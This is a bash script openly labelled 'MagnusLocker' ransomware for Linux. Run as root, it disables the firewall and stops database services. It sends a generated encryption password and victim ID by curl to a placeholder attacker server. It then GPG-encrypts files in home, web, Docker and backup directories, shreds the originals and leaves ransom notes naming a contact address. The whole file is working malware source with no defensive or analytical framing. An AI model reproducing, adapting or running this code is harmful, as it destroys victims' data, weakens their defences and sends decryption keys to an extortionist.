#!/bin/bash

# MagnusLocker Ransomware written in bash powered by GPG encryption
# Linux ransomware
# Author: Twemlow
# Hack The Planet!

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "you must have root perms to run this script!"
        exit 1
    fi
}

check_distro() {
    distro=$(uname -a)

    if [[ $distro == *"Ubuntu"* ]] || [[ $distro == *"Debian"* ]]; then
        package_manager="apt-get"
    elif [[ $distro == *"Red Hat"* ]] || [[ $distro == *"CentOS"* ]] || [[ $distro == *"Fedora"* ]]; then
        package_manager="yum"
    else
        echo "This script is not supported on this Linux distribution"
        exit 1
    fi
}

disable_firewall() {
    if [ -x "$(command -v ufw)" ]; then
        echo 'Disabling ufw firewall...'
        ufw disable
        echo 'ufw firewall has been disabled'
    elif [ -x "$(command -v iptables)" ]; then
        echo 'Disabling iptables firewall...'
        iptables -F
        echo 'iptables firewall has been disabled'
    else
        echo 'No firewall set up'
    fi
}

install_dependencies() {
    if ! [ -x "$(command -v gpg)" ]; then
        echo 'Error: gpg is not installed. Installing gpg...'
        $package_manager update && $package_manager install -y gnupg
        echo 'gpg has been installed'
    else
        echo 'gpg is already installed'
    fi

    if ! [ -x "$(command -v curl)" ]; then
        echo 'Error: curl is not installed. Installing curl...'
        $package_manager update && $package_manager install -y curl
        echo 'curl has been installed'
    else
        echo 'curl is already installed'
    fi

    if ! [ -x "$(command -v openssl)" ]; then
        echo 'Error: openssl is not installed. Installing openssl...'
        $package_manager update && $package_manager install -y openssl
        echo 'openssl has been installed'
    else
        echo 'openssl is already installed'
    fi
}

stop_database() {
    if systemctl list-units --all | grep -q "mariadb.service"; then
        systemctl stop mariadb.service
    elif systemctl list-units --all | grep -q "mysql.service"; then
        systemctl stop mysql.service
    elif systemctl list-units --all | grep -q "postgresql.service"; then
        systemctl stop postgresql.service
    elif service --status-all | grep -q "mariadb"; then
        service mariadb stop
    elif service --status-all | grep -q "mysql"; then
        service mysql stop
    elif service --status-all | grep -q "postgresql"; then
        service postgresql stop
    else
        echo "No database service found"
    fi
}

encrypt_files() {
    password=$(openssl rand -base64 32)

    victim_id=$(date +%s%N | cut -c1-11)

    ping -c 1 server > /dev/null
    if [ $? -eq 0 ]; then
      curl --data "victimid=$victim_id&password=$password" http://server:port/magnus

      echo "Encryption in progress..."

      target_dir_1="/var/lib/docker"
      target_dir_2="/home"
      target_dir_3="/var/www"
      target_dir_4="/home/backups"
      target_dir_5="/var/backups"

      for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
        if [ -d "$file" ]; then
            continue
        fi
        echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" 
      done

      for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
        if [ -f "$file.Magnus" ]; then
            dd if=/dev/urandom of=$file bs=1M count=5
            shred -n 2 -u $file
        fi
      done

      echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt

      for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type d); do
        cp R34DM3.txt "$dir/R34DM3.txt"
      done
    else
      echo "Error: server is not reachable, stopping encryption"
      exit 1
    fi
}

main() {
    check_root
    check_distro
    disable_firewall
    install_dependencies
    stop_database
    encrypt_files
}

main
